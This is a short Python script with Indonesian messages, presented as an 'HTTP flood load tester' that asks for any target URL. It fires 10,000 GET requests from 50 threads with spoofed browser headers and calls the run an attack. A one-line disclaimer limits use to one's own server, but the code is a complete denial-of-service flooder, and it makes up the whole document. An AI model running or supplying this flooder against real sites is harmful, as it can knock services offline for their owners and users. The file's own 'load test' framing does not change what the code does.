import requests
import threading
import time
import sys
import os
import subprocess

# Warna ANSI
GREEN = '\033[92m'
RED = '\033[91m'
CYAN = '\033[96m'
WHITE = '\033[97m'
RESET = '\033[0m'

# Konfigurasi
TARGET_URL = ""
THREADS = 50 
REQUESTS_PER_THREAD = 200

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def banner():
    clear_screen()
    
    # PATH GAMBAR TENKORAK
    image_path = "/storage/emulated/0/avg/3c81b6b26da2cee6b2964abf254ac8b9.jpg"
    
    try:
        # Nampilin gambar pake chafa
        subprocess.run(["chafa", "--size=35x15", "--align=center", image_path])
    except Exception:
        pass 

    print(f"{RED}======================================={RESET}")
    print(f"{WHITE}       [ HTTP FLOOD LOAD TESTER ]{RESET}")
    print(f"{RED}======================================={RESET}")
    print(f"{CYAN} Hanya untuk menguji server sendiri!{RESET}")
    print(f"{CYAN} Jangan gunakan untuk target ilegal.{RESET}\n")

def attack():
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive'
    }
    
    for _ in range(REQUESTS_PER_THREAD):
        try:
            requests.get(TARGET_URL, headers=headers, timeout=2)
        except requests.exceptions.RequestException:
            pass

def start_attack():
    global TARGET_URL
    
    banner()
    target = input(f"{WHITE}Masukkan URL target (contoh: http://localhost:5000): {RESET}").strip()
    if not target:
        print(f"{RED}[!] URL tidak boleh kosong.{RESET}")
        return
        
    TARGET_URL = target
    print(f"\n{GREEN}[*] Memulai serangan ke {TARGET_URL}{RESET}")
    print(f"{GREEN}[*] Total request: {THREADS * REQUESTS_PER_THREAD}{RESET}")
    print(f"{RED}[!] Tekan CTRL+C untuk menghentikan paksa.{RESET}\n")
    
    time.sleep(2)
    
    threads = []
    start_time = time.time()

    for i in range(THREADS):
        t = threading.Thread(target=attack)
        t.start()
        threads.append(t)
        sys.stdout.write(f"\r{GREEN}[+] Thread aktif: {i+1}/{THREADS}{RESET}")
        sys.stdout.flush()

    for t in threads:
        t.join()

    end_time = time.time()
    duration = end_time - start_time

    print(f"\n\n{CYAN}=== HASIL PENGUJIAN ==={RESET}")
    print(f"Waktu eksekusi : {duration:.2f} detik")
    print(f"Rata-rata RPS  : {(THREADS * REQUESTS_PER_THREAD) / duration:.2f} req/s")

if __name__ == "__main__":
    try:
        start_attack()
    except KeyboardInterrupt:
        print(f"\n\n{RED}[!] Dibatalkan oleh user. Keluar...{RESET}")
        os._exit(1)
